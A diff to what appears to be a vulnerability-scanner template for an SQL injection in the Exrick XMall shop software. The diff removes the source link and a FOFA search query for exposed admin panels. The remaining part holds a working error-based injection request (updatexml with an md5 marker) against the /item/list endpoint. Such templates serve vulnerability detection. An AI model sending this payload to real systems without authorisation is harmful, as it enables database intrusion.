@@ -3,12 +3,8 @@ info:
   name: Exrick XMall 开源商城 SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/aoa1dsrs9n494rom'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: aoa1dsrs9n494rom
-    fofa: app="XMall-后台管理系统"
 http:
 - raw:
   - 'GET /item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,md5(102103122),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136 HTTP/1.1
